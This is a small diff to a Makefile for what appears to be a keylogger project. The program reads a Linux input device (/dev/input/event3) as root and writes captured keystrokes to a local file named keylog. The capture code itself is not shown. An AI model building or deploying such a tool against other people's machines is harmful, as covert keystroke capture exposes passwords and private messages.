@@ -1,8 +1,9 @@
-DEVICE=/dev/input/event3
+EVENT_FILE=/dev/input/event3 # NOTE: hardware specific - must change.
+LOG_FILE=./keylog
 
 all:
 	gcc -Wall -Wextra -o main main.c
 run:all
-	sudo ./main $(DEVICE)
+	sudo ./main $(EVENT_FILE) $(LOG_FILE)
 clean:
-	rm -f main
+	rm -f main $(LOG_FILE)
